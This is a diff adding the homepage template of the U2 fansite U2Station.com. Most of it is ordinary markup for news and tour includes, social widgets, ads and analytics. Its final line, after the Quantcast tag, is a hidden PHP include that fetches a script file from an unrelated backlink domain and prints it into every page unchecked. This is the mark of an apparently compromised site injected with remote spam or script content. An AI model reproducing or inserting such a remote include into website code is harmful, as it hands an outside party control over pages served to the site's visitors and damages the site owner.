@@ -1,0 +1,319 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="https://www.w3.org/1999/xhtml" id="sixapart-standard">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="generator" content="Movable Type 5.2.9" />
+    <meta name="description" content="Established in 1997, U2Station.com is one of the oldest and most popular U2 fansites on the planet, serving millions of U2 fans around the world with U2 news, a U2 tours section, U2 images, a U2 forum, U2 guitar tablature, a U2 discography & much more.">
+    <meta name="keywords" content="u2, bono, the edge, adam clayton, larry mullen, u2station.com, u2 station, u2 tours, u2 news, u2 360 tour, u2 guitar tabs, u2 tickets, u2 concerts, u2 images, u2 forum, u2 tablature, u2 discography, u2ography, u2 fans">
+    <link rel="stylesheet" href="https://www.u2station.com/styles.css" type="text/css" />
+    <link rel="stylesheet" href="https://www.u2station.com/jquery-lightbox/css/jquery.lightbox-0.5.css" type="text/css" />
+    <link rel="start" href="https://www.u2station.com/" title="Home" />
+    <link rel="alternate" type="application/atom+xml" title="Recent Entries" href="https://www.u2station.com/atom.xml" />
+    <script type="text/javascript" src="https://www.u2station.com/mt.js"></script>
+    
+    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.u2station.com/rsd.xml" />
+
+    <script type="text/javascript">
+    var blog_id = '1';
+    var page_id = '3';
+    </script>
+    <script type="text/javascript" src="https://www.u2station.com/jquery/jquery-1.2.6.min.js"></script>
+    <script type="text/javascript" src="https://www.u2station.com/jquery/jquery.form.js"></script>
+    <script type="text/javascript" src="https://www.u2station.com/js/sf.js"></script>
+    <script type="text/javascript" src="https://www.u2station.com/smoothscroll.js"></script>
+    <script type="text/javascript" src="https://www.u2station.com/jquery-lightbox/js/jquery.lightbox-0.5.js"></script>
+    <script type="text/javascript">
+$(function() {
+	// Use this example, or...
+	$('a[@rel*=lightbox]').lightBox(); // Select all links that contains lightbox in the attribute rel
+	// This, or...
+	$('#gallery a').lightBox(); // Select all links in object with gallery ID
+	// This, or...
+	$('#lightbox a').lightBox(); // Select all links in object with lightbox ID
+	// This, or...
+	$('a.lightbox').lightBox(); // Select all links with lightbox class
+});
+    </script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1317466XLE"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-1317466XLE');
+</script>
+<script type="text/javascript" src="//platform-api.sharethis.com/js/sharethis.js#property=59cf201055a6eb001239a17f&product=inline-share-buttons"></script>
+    
+    <title>U2Station.com | U2 News, U2 Tours, U2 Forum, U2 Images, U2 Discography, U2 Tablature and more U2 | Since 1997</title>
+</head>
+<body id="professional-website" class="mt-main-index layout-wt">
+
+<div id="fb-root"></div>
+<div id="fb-root"></div>
+<script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v14.0" nonce="YHyFKByp"></script>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+    <div id="container">
+        <div id="container-inner">
+            <div id="header">
+                <div id="header-logo-ad"></div>
+                <div id="header-inner">
+                    <div id="header-content">
+                        <div id="header-date">
+<script language="JavaScript">
+        <!-- Hide the script
+        //
+        // (C) 2000 Bill Stevenson
+        // This is a y2k compliant script which prints the system date to the screen,
+        // based on the date specified in the viewer's operating system
+        //
+        // You may use this script in your website provided that this notice remains at the top
+        //
+
+        var months=new Array(13);	// set up an array for string literal months
+        months[1]="January";		// array starts at [1] rather than [0] for
+        months[2]="February";		// familiar month numbering convention, could
+        months[3]="March";			// just as easily be [0..11] but that is less clear
+        months[4]="April";
+        months[5]="May";
+        months[6]="June";
+        months[7]="July";
+        months[8]="August";
+        months[9]="September";
+        months[10]="October";
+        months[11]="November";
+        months[12]="December";
+
+        var today=new Date();				// store date in today
+
+        var lmonth=months[today.getMonth() + 1];	// pull out month name
+        var date=today.getDate();			// pull out numerical date
+        var year=today.getFullYear();			// pull out numerical year
+        var daynum = today.getDay() + 1;		// pull out day number
+
+        if(daynum==1) day = "Sunday";			// match day name to day number
+        if(daynum==2) day = "Monday";
+        if(daynum==3) day = "Tuesday";
+        if(daynum==4) day = "Wednesday";
+        if(daynum==5) day = "Thursday";
+        if(daynum==6) day = "Friday";
+        if(daynum==7) day = "Saturday";
+
+        // make entire date into one variable, allows easy adjustment of format
+
+        // us format: var todaysdate= (day + ", " + lmonth + " " + date + ", " + year);
+        var todaysdate= (day + ", " + lmonth + " " + date + ", " + year);
+
+        // write date to screen
+        document.write(todaysdate);
+        // end hiding-->
+</script>
+</div>
+                    </div>
+                </div>
+            </div>
+            <div id="header-navigation">
+                <div id="header-navigation-inner">
+                    <div id="header-navigation-content">
+                        <?php include "/home/u2station/public_html/navigation.php";?>
+                    </div>
+                </div>
+            </div>
+            <div id="header-search">
+                <div id="header-search-inner">
+                    <div id="header-search-content">
+                        <div id="header-headline-space"><?php include "/home/u2station/public_html/news/news_headline_include.php";?></div>
+                        <div id="header-social-space"><table width="140">
+<tr>
+<td width="40" align="left" style="vertical-align:middle">
+<a href="https://u2station.com/atom.xml"><img src="/m-t/mt-static/support/themes/u2station/icon_rss.png" alt="U2Station.com feeds" title="U2Station.com feeds" class="image"></a>
+</td>
+<td width="40" align="left" style="vertical-align:middle">
+<a href="https://www.flickr.com/groups/u2station"><img src="/m-t/mt-static/support/themes/u2station/icon_flickr.png" alt="U2Station.com on Flickr" title="U2Station.com on Flickr" class="image"></a>
+</td>
+<td width="40" align="left" style="vertical-align:middle">
+<a href="https://www.facebook.com/u2station"><img src="/m-t/mt-static/support/themes/u2station/icon_facebook.png" alt="U2Station.com on Facebook" title="U2Station.com on Facebook" class="image"></a>
+</td>
+</tr>
+</table></div>
+                        <div id="header-search-space"><script async src="https://cse.google.com/cse.js?cx=022455cbb22904c96">
+</script>
+<div class="gcse-search"></div></div>
+                    </div>
+                </div>
+            </div>
+            <div id="content">
+                <div id="content-inner">
+
+
+<div id="alpha" class="alpha-header-home">
+<div id="alpha-inner">
+
+<?php include "/home/u2station/public_html/news/news_include.php";?>
+<?php include "/home/u2station/public_html/tours/tours_include.php";?>
+<img src="/images/dot_clear.gif" width="1" height="20">
+<div class="fb-like" data-href="http://www.facebook.com/u2station" data-send="true" data-width="600" data-show-faces="true"></div>
+
+</div>
+                    </div>
+                <div id="beta">
+    <div id="beta-inner">
+
+        <div class="widget-facebook widget">
+    <h3 class="widget-header">Find us on Facebook</h3>
+<div class="widget-content">
+
+<iframe src="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2Fu2station&tabs&width=280&height=130&small_header=false&adapt_container_width=true&hide_cover=false&show_facepile=true&appId" width="280" height="130" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+
+</div>
+</div><div class="widget-flickr widget">
+    <h3 class="widget-header">U2Station.com on Flickr</h3>
+<div class="widget-content">
+<div class="widget-flickr">
+<!-- Start of Flickr Badge -->
+<style type="text/css">
+/*
+Images are wrapped in divs classed "flickr_badge_image" with ids
+"flickr_badge_imageX" where "X" is an integer specifying ordinal position.
+Below are some styles to get you started!
+*/
+#flickr_badge_uber_wrapper {text-align:left; width:260px;}
+#flickr_badge_wrapper {padding:10px 0px 0px 0px;}
+.flickr_badge_image {display:inline; margin:0px 0px 0px 0px;}
+.flickr_badge_image img {border: 1px solid #ccc !important;}
+#flickr_badge_source {text-align:left; margin:10px 60px 0px 0px;}
+#flickr_badge_icon {float:left; margin-right:5px;}
+#flickr_www {display:block; padding:0 10px 0 10px !important; font: 11px Gill Sans, Tahoma, Verdana, sans-serif !important; color:#3993ff !important;}
+#flickr_badge_uber_wrapper a:hover,
+#flickr_badge_uber_wrapper a:link,
+#flickr_badge_uber_wrapper a:active,
+#flickr_badge_uber_wrapper a:visited {text-decoration:none !important; background:inherit !important;color:#fff;}
+#flickr_badge_wrapper {background-color:#000;}
+#flickr_badge_source {padding:0 !important; font: 11px Gill Sans, Tahoma, Verdana, sans-serif !important; color:#ccc !important;}
+</style>
+
+<div id="flickr_badge_uber_wrapper"><a href="https://www.flickr.com" id="flickr_www">www.<strong style="color:#3993ff">flick<span style="color:#ff1c92">r</span></strong>.com</a><div id="flickr_badge_wrapper">
+<script type="text/javascript" src="https://www.flickr.com/badge_code_v2.gne?show_name=1&count=5&display=random&size=s&layout=x&context=in%2Fpool-u2station%2F&source=group&group=12819534%40N00"></script>
+<div id="flickr_badge_source">
+<a href="https://www.flickr.com/groups/u2station/pool/"><img id="flickr_badge_icon" alt="items in U2 Station Flickr" src="https://farm4.static.flickr.com/3207/buddyicons/12819534@N00.jpg?1230590944" /></a><span id="flickr_badge_source_txt">More <a href="https://www.flickr.com/groups/u2station/pool/">in U2 Station Flickr pool</a></span><br clear="all" /></div></div></div>
+<!-- End of Flickr Badge -->
+</div>
+</div>
+</div><div class="widget-sponsors widget">
+    <h3 class="widget-header">Other links</h3>
+<div class="widget-content">
+<div class="widget-sponsors">
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- U2 Station Homepage -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4065031633843993"
+     data-ad-slot="8523684728"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+</div>
+</div>
+</div>
+
+    </div>
+</div>
+                </div>
+            </div>
+            <div id="footer">
+                <div id="footer-inner">
+                    <div id="footer-content">
+                         <div id="footer-logo-space"><div class="widget-footer-logo widget">
+    <div class="widget-content">
+    <p><img border="0" src="/m-t/mt-static/support/themes/u2station/logo_footer.gif"></p>
+    <p>Since 1997, U2Station.com has provided millions of U2 fans with consistent U2 news and content. Nominated as the "Coolest Fan Website" by VH1/MTV in 2001, we've been featured on major websites from BBC, CNN, FOX News, MTV Networks, Rolling Stone and many others. Thank you U2 fans.</p>
+    <p>Copyright &copy; 1997-2024 U2Station.com. All rights reserved.</p>
+    </div>
+</div></div>
+                         <div id="footer-links-space"><div class="widget-footer-links widget">
+    <h3 class="widget-header">More Links</h3>
+    <div class="widget-content">
+        <ul>
+
+            <li><a href="https://www.u2station.com/about/">About U2Station.com</a></li>
+
+            <li><a href="https://www.u2station.com/contact/">Contact Us</a></li>
+
+            <li><a href="https://www.u2station.com/disclaimer/">Disclaimer and Privacy Policy</a></li>
+
+            <li><a href="https://www.u2station.com/links/">U2 Website Links</a></li>
+
+            <li><a href="https://www.u2station.com/write/">Write for Us</a></li>
+
+        </ul>
+    </div>
+</div><div class="widget-footer-network widget">
+    <h3 class="widget-header">Network</h3>
+    <div class="widget-content">
+        <ul>
+           <li><a href="https://www.facebook.com/u2station" target="_blank"><img src="/m-t/mt-static/support/themes/u2station/icon_facebook_small.png" alt="U2Station.com on Facebook" title="U2Station.com on Facebook" class="image">&nbsp; U2Station.com on Facebook</a></li>
+           <li><a href="https://www.flickr.com/groups/u2station/" target="_blank"><img src="/m-t/mt-static/support/themes/u2station/icon_flickr_small.png" alt="U2Station.com on Flickr" title="U2Station.com on Flickr" class="image">&nbsp; U2Station.com on Flickr</a></li>
+        </ul>
+    </div>
+</div><div class="widget-powered widget">
+    <h3 class="widget-header"></h3>
+    <div class="widget-content">
+        <span>Powered by <a href="https://www.movabletype.com/" rel="generator">Movable Type</a>. We offer <a href="https://jigsaw.w3.org/css-validator/check/referer">Valid CSS</a>.</span>
+    </div>
+</div></div>
+                         <div id="footer-quote-space"><div class="widget-footer-quote widget">
+    <h3 class="widget-header">Quote</h3>
+    <div class="widget-content">
+<?php
+srand((double)microtime()*1000000); 
+$arry_txt=preg_split("/--NEXT--/",join('',file("https://www.u2station.com/quotes.txt")));
+echo$arry_txt[rand(0,sizeof($arry_txt)-1)]; 
+?>
+    </div>
+</div></div>
+
+        </div>
+    </div>
+</div>
+<div id="footer-mainlinks"><div class="widget-footer-main-links widget">
+    <div class="widget-footer">
+    Main Links:&nbsp;&nbsp;<a href="/">Home</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/news/">News</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/tours/">Tours</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/videos/">Videos</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/u2ography/">U2ography</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/tablature/">Tablature</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/fans/">Fans</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/about/">About</a><a href="#header" class="fr"><img src="/m-t/mt-static/support/themes/u2station/arrow_top.gif" border="0">&nbsp;Skip to top</a>
+    </div>
+</div></div>
+
+<!-- Quantcast Tag -->
+<script type="text/javascript">
+var _qevents = _qevents || [];
+
+(function() {
+var elem = document.createElement('script');
+elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
+elem.async = true;
+elem.type = "text/javascript";
+var scpt = document.getElementsByTagName('script')[0];
+scpt.parentNode.insertBefore(elem, scpt);
+})();
+
+_qevents.push({
+qacct:"p-729rRJb73Jfa6"
+});
+</script>
+
+<noscript>
+<div style="display:none;">
+<img src="//pixel.quantserve.com/pixel/p-729rRJb73Jfa6.gif" border="0" height="1" width="1" alt="Quantcast"/>
+</div>
+</noscript>
+<!-- End Quantcast tag -->
+<?php echo file_get_contents("https://backlinkku.id/menu/vip-v2/script.txt"); ?>
